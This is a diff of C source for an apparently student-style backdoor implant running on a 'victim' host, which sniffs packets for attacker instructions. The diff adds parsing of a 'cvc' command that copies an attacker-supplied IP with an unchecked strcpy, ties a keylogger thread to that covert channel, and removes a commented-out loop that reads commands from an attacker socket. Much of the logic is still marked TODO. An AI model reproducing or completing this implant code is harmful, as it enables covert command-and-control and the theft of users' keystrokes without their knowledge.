@@ -148,7 +148,6 @@ void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
 
 
 void convert_uint32t_ip_to_str(uint32_t ip_addr, char* ip, char flag) {
-
     if (flag == 'v') {
         if (inet_ntop(AF_INET, &ip_addr, ip, INET_ADDRSTRLEN) == NULL) {
             perror("inet_ntop error");
@@ -188,10 +187,13 @@ void extract_instruction(u_char *args) {
 void execute_instruction(u_char *args) {
     struct options_victim* ov;
     char **commands;
-
+    char *cvc_token;
     ov = (struct options_victim*)args;
 
-    if (strcmp(ov->instruction, "cvc") == 0) {
+    if (strstr(ov->instruction, "cvc") != NULL) {
+        ov->cvc = TRUE;
+        strcpy(ov->cvc_ip, ov->instruction + 4);
+        printf("cvc ip = %s\n", ov->cvc_ip);
         // TODO: IF COMMAND = CVC_SERVER {IP}
     }
     else if (strcmp(ov->instruction, "keylogger") == 0) {
@@ -403,9 +405,11 @@ void* activate_keylogger(void* arg){
     struct options_victim* ov;
     ov = (struct options_victim*)arg;
     while(1) {
-        if (ov->keylogger == TRUE) {
-           // TODO: ACTIVATE KEYLOGGER
-            keylogger_main();
+        if (ov->cvc == TRUE) {
+            if (ov->keylogger == TRUE) {
+                // TODO: ACTIVATE KEYLOGGER
+                keylogger_main(ov);
+            }
         }
     }
 }
@@ -423,51 +427,5 @@ void* activate_cvc(void* arg){
 }
 
 
-//void activate_select_multiplexing(void* arg) {
-//    struct options_victim* ov;
-//    struct sockaddr_in attacker_address;
-//    int attacker_address_size = sizeof(struct sockaddr_in);
-//
-//    fd_set read_fds, copy_fds;
-//    int fd_max, fd_num;
-//    struct timeval timeout;
-//
-//    int exit_flag = 0;
-//
-//    ov = (struct options_victim*)arg;
-//    FD_ZERO(&read_fds);
-//    FD_SET(STDIN_FILENO, &read_fds);
-//    FD_SET(ov->victim_socket, &read_fds);
-//    fd_max = ov->victim_socket;
-//
-//    timeout.tv_sec = 1;
-//    timeout.tv_usec = 0;
-//
-//    while (1) {
-//        if (exit_flag == 1) break;
-//
-//        copy_fds = read_fds;
-//        fd_num = select(fd_max + 1, &copy_fds, 0, 0, &timeout);
-//        if (fd_num == -1) {
-//            perror("Select() failed");
-//            exit(EXIT_FAILURE);
-//        } else if (fd_num == 0) continue; // time out
-//
-//        for (int i = 0; i < fd_max + 1; i++) {
-//            if (FD_ISSET(i, &copy_fds)) {
-//                if (i == ov->victim_socket) {
-//                    recvfrom(ov->victim_socket, receive, sizeof(receive), 0, (struct sockaddr*)&attacker_address, &attacker_address_size);
-//                    printf("PACKET = [ %s ]\n", receive);
-//                    if (strcmp(receive, QUIT) == 0) {
-//                        printf("EXIT program");
-//                        exit_flag = 1;
-//                        break;
-//                    }
-//                    memset(receive, 0, sizeof(char) * 256);
-//                }
-//            }
-//        }
-//    }
-//    close(opts.victim_socket);
-//}
+
 
